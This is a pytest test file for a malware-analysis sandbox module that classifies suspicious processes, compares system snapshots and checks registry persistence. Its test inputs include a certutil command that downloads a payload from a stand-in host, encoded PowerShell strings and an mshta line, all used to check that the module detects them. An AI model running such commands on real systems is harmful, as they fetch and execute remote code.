"""Tests for HashGuard sandbox module."""

import json
import os
from unittest.mock import patch, MagicMock

import pytest

from hashguard.sandbox import (
    BehaviorEvent,
    SandboxResult,
    SystemSnapshot,
    _classify_process,
    _get_watched_dirs,
    _safe_size,
    _build_wsb_config,
    _SUSPICIOUS_PROCS,
    _EVASION_PATTERNS,
    _PERSISTENCE_REGISTRY_KEYS,
    check_sandbox_availability,
    compare_snapshots,
    generate_sandbox_config,
    monitor_execution,
    query_etw_process_events,
    check_registry_persistence,
    enhanced_monitor,
    launch_windows_sandbox,
    take_snapshot,
)

# ── Dataclasses ──────────────────────────────────────────────────────────────


class TestSystemSnapshot:
    def test_defaults(self):
        s = SystemSnapshot()
        assert s.timestamp == ""
        assert s.processes == {}
        assert s.network_connections == []
        assert s.files_in_watched == {}


class TestBehaviorEvent:
    def test_fields(self):
        e = BehaviorEvent(
            event_type="process_spawn",
            timestamp="2024-01-01",
            description="test",
            severity="high",
        )
        assert e.event_type == "process_spawn"
        assert e.severity == "high"


class TestSandboxResult:
    def test_defaults(self):
        r = SandboxResult()
        assert r.available is False
        assert r.mode == "monitor"
        assert r.events == []
        assert r.status == "not_started"

    def test_to_dict(self):
        event = BehaviorEvent(
            event_type="file_write",
            timestamp="2024-01-01",
            description="Wrote to temp",
        )
        r = SandboxResult(
            available=True,
            mode="monitor",
            events=[event],
            summary={"file_write": 1},
            duration=2.5,
            status="completed",
        )
        d = r.to_dict()
        assert d["available"] is True
        assert d["duration"] == 2.5
        assert len(d["events"]) == 1
        assert d["events"][0]["event_type"] == "file_write"
        assert d["summary"]["file_write"] == 1


# ── Watched dirs ─────────────────────────────────────────────────────────────


class TestGetWatchedDirs:
    def test_returns_list(self):
        dirs = _get_watched_dirs()
        assert isinstance(dirs, list)
        # All returned must be existing directories
        import os

        for d in dirs:
            assert os.path.isdir(d)


# ── Process classification ───────────────────────────────────────────────────


class TestClassifyProcess:
    def test_clean_process(self):
        assert _classify_process("notepad.exe") is None

    def test_suspicious_lolbin(self):
        event = _classify_process("powershell.exe", "Get-Date")
        assert event is not None
        assert event.event_type == "process_spawn"
        assert event.severity == "medium"

    def test_high_severity_evasion(self):
        event = _classify_process("powershell.exe", "powershell -EncodedCommand SQBuAHYAbwBrAGUA")
        assert event is not None
        assert event.severity == "high"
        assert event.event_type == "evasion"

    def test_cmd_lolbin(self):
        event = _classify_process("cmd.exe", "cmd /c dir")
        assert event is not None

    def test_mshta_lolbin(self):
        event = _classify_process("mshta.exe", "mshta vbscript:Execute")
        assert event is not None

    def test_certutil_download(self):
        event = _classify_process(
            "certutil.exe", "certutil -urlcache -split -f http://evil.com/payload"
        )
        assert event is not None
        # downloadstring pattern won't match certutil but it's still suspicious
        assert event.event_type in ("process_spawn", "evasion")


# ── Sandbox availability ─────────────────────────────────────────────────────


class TestSandboxAvailability:
    def test_returns_dict(self):
        result = check_sandbox_availability()
        assert isinstance(result, dict)
        assert "psutil" in result
        assert "windows_sandbox" in result
        assert "any_available" in result


# ── Safe size helper ─────────────────────────────────────────────────────────


class TestSafeSize:
    def test_real_file(self, tmp_path):
        p = tmp_path / "f.txt"
        p.write_bytes(b"hello")
        assert _safe_size(str(p)) == 5

    def test_nonexistent(self):
        assert _safe_size("/no/such/file") == 0


# ── Constants ────────────────────────────────────────────────────────────────


class TestConstants:
    def test_suspicious_procs(self):
        assert "powershell.exe" in _SUSPICIOUS_PROCS
        assert "cmd.exe" in _SUSPICIOUS_PROCS
        assert len(_SUSPICIOUS_PROCS) >= 10

    def test_evasion_patterns(self):
        assert any("enc" in p for p in _EVASION_PATTERNS)

    def test_persistence_registry_keys(self):
        assert len(_PERSISTENCE_REGISTRY_KEYS) >= 4
        assert any("Run" in k for k in _PERSISTENCE_REGISTRY_KEYS)


# ── Snapshot comparison ──────────────────────────────────────────────────────


class TestCompareSnapshots:
    def test_empty_identical(self):
        s = SystemSnapshot()
        events = compare_snapshots(s, s)
        assert events == []

    def test_new_process_detected(self):
        before = SystemSnapshot()
        after = SystemSnapshot(
            processes={
                1234: {"name": "notepad.exe", "exe": "C:\\notepad.exe", "cmdline": "notepad"},
            }
        )
        events = compare_snapshots(before, after)
        assert len(events) == 1
        assert events[0].event_type == "process_spawn"
        assert "notepad.exe" in events[0].description

    def test_suspicious_new_process(self):
        before = SystemSnapshot()
        after = SystemSnapshot(
            processes={
                999: {
                    "name": "powershell.exe",
                    "exe": "C:\\powershell.exe",
                    "cmdline": "powershell -enc AAAA",
                },
            }
        )
        events = compare_snapshots(before, after)
        assert len(events) == 1
        assert events[0].severity == "high"
        assert events[0].event_type == "evasion"

    def test_new_network_connection(self):
        before = SystemSnapshot()
        after = SystemSnapshot(
            processes={100: {"name": "malware.exe", "exe": "", "cmdline": ""}},
            network_connections=[
                {"remote": "1.2.3.4:443", "pid": 100, "local": "0.0.0.0:5555", "status": "ESTABLISHED"},
            ],
        )
        events = compare_snapshots(before, after)
        net = [e for e in events if e.event_type == "network_connect"]
        assert len(net) == 1
        assert "1.2.3.4" in net[0].description
        assert net[0].severity == "high"

    def test_new_file_in_startup(self, tmp_path):
        startup = tmp_path / "Startup"
        startup.mkdir()
        payload = startup / "evil.exe"
        payload.write_bytes(b"MZ")

        before = SystemSnapshot(files_in_watched={})
        after = SystemSnapshot(files_in_watched={str(payload): payload.stat().st_mtime})
        events = compare_snapshots(before, after)
        assert len(events) == 1
        assert events[0].event_type == "persistence"
        assert events[0].severity == "critical"

    def test_new_exe_file(self, tmp_path):
        f = tmp_path / "dropped.exe"
        f.write_bytes(b"MZ")
        before = SystemSnapshot(files_in_watched={})
        after = SystemSnapshot(files_in_watched={str(f): f.stat().st_mtime})
        events = compare_snapshots(before, after)
        assert len(events) == 1
        assert events[0].severity == "high"
        assert events[0].event_type == "file_write"

    def test_modified_file(self, tmp_path):
        f = tmp_path / "data.txt"
        f.write_text("a")
        before = SystemSnapshot(files_in_watched={str(f): 1000.0})
        after = SystemSnapshot(files_in_watched={str(f): 2000.0})
        events = compare_snapshots(before, after)
        assert len(events) == 1
        assert events[0].event_type == "file_write"
        assert events[0].severity == "low"

    def test_no_change_when_mtime_same(self, tmp_path):
        f = tmp_path / "data.txt"
        f.write_text("a")
        before = SystemSnapshot(files_in_watched={str(f): 1000.0})
        after = SystemSnapshot(files_in_watched={str(f): 1000.0})
        events = compare_snapshots(before, after)
        assert events == []


# ── Take snapshot ────────────────────────────────────────────────────────────


class TestTakeSnapshot:
    def test_returns_snapshot(self):
        snap = take_snapshot()
        assert isinstance(snap, SystemSnapshot)
        assert snap.timestamp != ""

    @patch("hashguard.sandbox.HAS_PSUTIL", False)
    def test_no_psutil(self):
        snap = take_snapshot()
        assert snap.processes == {}
        assert snap.network_connections == []


# ── WSB config builder ───────────────────────────────────────────────────────


class TestBuildWSBConfig:
    def test_basic_config(self, tmp_path):
        sample = tmp_path / "malware.exe"
        sample.write_bytes(b"MZ")
        config = _build_wsb_config(str(sample))
        assert "<Configuration>" in config
        assert "ReadOnly>true" in config
        assert "Networking>Disable" in config
        assert "malware.exe" in config

    def test_filename_sanitisation(self, tmp_path):
        sample = tmp_path / "mal ware (1).exe"
        sample.write_bytes(b"MZ")
        config = _build_wsb_config(str(sample))
        # Spaces and parens should be replaced with underscores
        assert "mal_ware__1_.exe" in config

    def test_memory_limit(self, tmp_path):
        sample = tmp_path / "test.exe"
        sample.write_bytes(b"MZ")
        config = _build_wsb_config(str(sample))
        assert "MemoryInMB>2048" in config


# ── Generate sandbox config ──────────────────────────────────────────────────


class TestGenerateSandboxConfig:
    def test_returns_dict(self, tmp_path):
        sample = tmp_path / "test.exe"
        sample.write_bytes(b"MZ")
        d = generate_sandbox_config(str(sample))
        assert "windows_sandbox" in d
        assert "manual_analysis" in d
        assert "wsb_config" in d["windows_sandbox"]
        assert "commands" in d["manual_analysis"]


# ── Monitor execution ────────────────────────────────────────────────────────


class TestMonitorExecution:
    @patch("hashguard.sandbox.HAS_PSUTIL", False)
    def test_no_psutil_returns_error(self):
        result = monitor_execution(duration_seconds=1)
        assert result.status == "error"
        assert result.available is False

    @patch("hashguard.sandbox.time.sleep")
    @patch("hashguard.sandbox.take_snapshot")
    @patch("hashguard.sandbox.HAS_PSUTIL", True)
    def test_monitor_completes(self, mock_snap, mock_sleep):
        s = SystemSnapshot(timestamp="2024-01-01")
        mock_snap.return_value = s
        result = monitor_execution(duration_seconds=1)
        assert result.status == "completed"
        assert result.available is True
        assert result.mode == "monitor"
        mock_sleep.assert_called_once()

    @patch("hashguard.sandbox.time.sleep")
    @patch("hashguard.sandbox.take_snapshot")
    @patch("hashguard.sandbox.HAS_PSUTIL", True)
    def test_monitor_detects_events(self, mock_snap, mock_sleep):
        before = SystemSnapshot(timestamp="t1")
        after = SystemSnapshot(
            timestamp="t2",
            processes={999: {"name": "notepad.exe", "exe": "", "cmdline": ""}},
        )
        mock_snap.side_effect = [before, after]
        result = monitor_execution(duration_seconds=1)
        assert len(result.events) == 1
        assert result.summary.get("process_spawn", 0) >= 1


# ── ETW process events ──────────────────────────────────────────────────────


class TestQueryETWProcessEvents:
    @patch("hashguard.sandbox.subprocess.run")
    def test_security_log_events(self, mock_run):
        event_data = json.dumps([{
            "TimeCreated": "2024-01-01T00:00:00",
            "NewProcess": "C:\\Windows\\System32\\powershell.exe",
            "ParentProcess": "C:\\Windows\\System32\\cmd.exe",
            "CommandLine": "powershell Get-Date",
        }])
        mock_run.return_value = MagicMock(returncode=0, stdout=event_data)
        events = query_etw_process_events(since_seconds=60)
        assert len(events) >= 1
        assert events[0].event_type in ("process_spawn", "evasion")

    @patch("hashguard.sandbox.subprocess.run")
    def test_single_event_dict(self, mock_run):
        """Single event returned as dict (not list)."""
        event_data = json.dumps({
            "TimeCreated": "2024-01-01",
            "NewProcess": "notepad.exe",
            "ParentProcess": "",
            "CommandLine": "",
        })
        mock_run.return_value = MagicMock(returncode=0, stdout=event_data)
        events = query_etw_process_events(since_seconds=60)
        assert len(events) == 1

    @patch("hashguard.sandbox.subprocess.run")
    def test_no_events(self, mock_run):
        mock_run.return_value = MagicMock(returncode=0, stdout="")
        events = query_etw_process_events(since_seconds=60)
        assert events == []

    @patch("hashguard.sandbox.subprocess.run")
    def test_timeout_handled(self, mock_run):
        import subprocess
        mock_run.side_effect = subprocess.TimeoutExpired(cmd="test", timeout=15)
        events = query_etw_process_events(since_seconds=60)
        assert events == []

    @patch("hashguard.sandbox.subprocess.run")
    def test_sysmon_fallback(self, mock_run):
        """When Security log is empty, tries Sysmon."""
        def side_effect(*args, **kwargs):
            cmd_str = " ".join(args[0]) if args else ""
            if "Security" in cmd_str:
                return MagicMock(returncode=0, stdout="")
            else:
                # Sysmon response
                return MagicMock(returncode=0, stdout=json.dumps(["<xml>event1</xml>"]))
        mock_run.side_effect = side_effect
        events = query_etw_process_events(since_seconds=60)
        assert len(events) == 1
        assert "Sysmon" in events[0].details.get("source", "")


# ── Registry persistence ────────────────────────────────────────────────────


class TestCheckRegistryPersistence:
    def test_returns_list(self):
        events = check_registry_persistence()
        assert isinstance(events, list)

    @patch("hashguard.sandbox.winreg", create=True)
    def test_suspicious_entry_detected(self, mock_winreg):
        """Mock winreg to simulate a suspicious registry entry."""
        mock_winreg_module = MagicMock()
        mock_winreg_module.HKEY_CURRENT_USER = 0x80000001
        mock_winreg_module.HKEY_LOCAL_MACHINE = 0x80000002
        mock_winreg_module.KEY_READ = 0x20019

        mock_key = MagicMock()
        mock_winreg_module.OpenKey.return_value = mock_key
        # Return suspicious value on first call, then always OSError
        call_count = {"n": 0}
        def enum_side_effect(key, idx):
            call_count["n"] += 1
            if call_count["n"] == 1:
                return ("malware", "powershell -enc AAA", 1)
            raise OSError("no more values")
        mock_winreg_module.EnumValue.side_effect = enum_side_effect
        mock_winreg_module.CloseKey.return_value = None

        with patch.dict("sys.modules", {"winreg": mock_winreg_module}):
            with patch("hashguard.sandbox.winreg", mock_winreg_module, create=True):
                events = check_registry_persistence()
        assert isinstance(events, list)
        assert any(e.event_type == "persistence" for e in events)


# ── Enhanced monitor ─────────────────────────────────────────────────────────


class TestEnhancedMonitor:
    @patch("hashguard.sandbox.HAS_PSUTIL", False)
    def test_no_psutil_returns_error(self):
        result = enhanced_monitor(duration_seconds=1)
        assert result.status == "error"
        assert result.mode == "enhanced_monitor"

    @patch("hashguard.sandbox.check_registry_persistence", return_value=[])
    @patch("hashguard.sandbox.query_etw_process_events", return_value=[])
    @patch("hashguard.sandbox.time.sleep")
    @patch("hashguard.sandbox.take_snapshot")
    @patch("hashguard.sandbox.HAS_PSUTIL", True)
    def test_enhanced_completes(self, mock_snap, mock_sleep, mock_etw, mock_reg):
        s = SystemSnapshot(timestamp="2024-01-01")
        mock_snap.return_value = s
        result = enhanced_monitor(duration_seconds=1)
        assert result.status == "completed"
        assert result.mode == "enhanced_monitor"

    @patch("hashguard.sandbox.check_registry_persistence")
    @patch("hashguard.sandbox.query_etw_process_events", return_value=[])
    @patch("hashguard.sandbox.time.sleep")
    @patch("hashguard.sandbox.take_snapshot")
    @patch("hashguard.sandbox.HAS_PSUTIL", True)
    def test_new_registry_entry_flagged(self, mock_snap, mock_sleep, mock_etw, mock_reg):
        s = SystemSnapshot(timestamp="t1")
        mock_snap.return_value = s
        # Before: no entries, After: one suspicious entry
        mock_reg.side_effect = [
            [],
            [BehaviorEvent(
                event_type="persistence",
                timestamp="t2",
                description="Suspicious registry persistence: run key",
                severity="high",
            )],
        ]
        result = enhanced_monitor(duration_seconds=1)
        new_entries = [e for e in result.events if "NEW" in e.description]
        assert len(new_entries) == 1
        assert new_entries[0].severity == "critical"


# ── Launch Windows Sandbox ───────────────────────────────────────────────────


class TestLaunchWindowsSandbox:
    @patch("hashguard.sandbox._check_windows_sandbox", return_value=False)
    def test_sandbox_not_available(self, mock_check, tmp_path):
        sample = tmp_path / "test.exe"
        sample.write_bytes(b"MZ")
        result = launch_windows_sandbox(str(sample))
        assert result.status == "error"
        assert len(result.events) == 1

    @patch("hashguard.sandbox.time.sleep")
    @patch("hashguard.sandbox.subprocess.Popen")
    @patch("hashguard.sandbox.take_snapshot")
    @patch("hashguard.sandbox._check_windows_sandbox", return_value=True)
    @patch("hashguard.sandbox.HAS_PSUTIL", True)
    def test_sandbox_launches(self, mock_check, mock_snap, mock_popen, mock_sleep, tmp_path):
        sample = tmp_path / "test.exe"
        sample.write_bytes(b"MZ")
        s = SystemSnapshot(timestamp="t1")
        mock_snap.return_value = s
        result = launch_windows_sandbox(str(sample))
        assert result.status == "completed"
        assert result.mode == "windows_sandbox"
        assert result.available is True
